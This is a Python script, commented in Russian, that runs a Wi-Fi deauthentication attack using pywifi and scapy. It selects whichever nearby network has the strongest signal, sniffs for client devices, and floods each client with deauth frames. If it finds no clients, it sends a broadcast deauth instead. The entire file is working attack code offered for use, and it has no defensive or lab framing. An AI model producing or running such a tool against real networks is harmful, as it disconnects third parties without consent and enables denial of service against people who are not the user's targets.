import pywifi
import time
from scapy.all import *

# Функция для сканирования доступных Wi-Fi сетей и выбора сети с лучшим сигналом
def get_best_wifi_network():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Используем первый доступный интерфейс
    iface.scan()  # Запускаем сканирование Wi-Fi сетей
    time.sleep(5)  # Ждем завершения сканирования
    networks = iface.scan_results()

    # Находим сеть с наилучшим сигналом
    best_network = max(networks, key=lambda net: net.signal)

    if not best_network.bssid:
        raise ValueError("Не удалось получить BSSID сети.")

    print(f"Автоматически выбрана сеть: SSID: {best_network.ssid}, Signal: {best_network.signal}, BSSID: {best_network.bssid}")
    return best_network


# Функция для поиска клиентов в сети
def find_clients(bssid, interface):
    print(f"Поиск клиентов в сети {bssid}...")

    if not bssid:
        raise ValueError("BSSID не может быть пустым.")

    clients = []

    # Пакет для отправки в эфир для обнаружения клиентов
    packet = RadioTap() / Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11ProbeReq()

    def packet_callback(pkt):
        if pkt.haslayer(Dot11) and (pkt.addr2 != bssid and pkt.addr2 not in clients):
            clients.append(pkt.addr2)
            print(f"Найден клиент: {pkt.addr2}")

    # Сниффинг (прослушивание эфира)
    sniff(iface=interface, prn=packet_callback, timeout=10)

    if clients:
        print(f"Найдены клиенты: {clients}")
    else:
        print("Не найдено ни одного клиента.")
    
    return clients


# Функция для выполнения deauth-атаки
def deauth_attack(bssid, client, interface, count=10):
    if not bssid or not client:
        raise ValueError(f"Ошибка: BSSID или MAC-адрес клиента пусты. BSSID: {bssid}, Client: {client}")

    # Создаем deauthentication пакет
    pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)

    print(f"Запуск deauth атаки на {client} через точку доступа {bssid}")

    # Отправляем пакеты
    sendp(pkt, iface=interface, count=count, inter=.1)
    print("Атака завершена.")


if __name__ == "__main__":
    try:
        # Шаг 1: Автоматически выбираем лучшую Wi-Fi сеть
        best_network = get_best_wifi_network()

        # Шаг 2: Ищем клиентов в выбранной сети
        target_bssid = best_network.bssid

        # Определяем интерфейс Wi-Fi
        wifi = pywifi.PyWiFi()
        interface = wifi.interfaces()[0].name()

        print(f"Используемый интерфейс: {interface}")
        clients = find_clients(target_bssid, interface)

        # Если клиенты найдены, атакуем всех
        if clients:
            for client in clients:
                # Шаг 3: Запуск deauth-атаки на каждого клиента
                deauth_attack(target_bssid, client, interface)
        else:
            # Если не найдено клиентов, делаем широковещательную атаку
            print("Нет клиентов. Запуск широковещательной deauth-атаки.")
            deauth_attack(target_bssid, "ff:ff:ff:ff:ff:ff", interface)

    except ValueError as e:
        print(f"Ошибка: {e}")
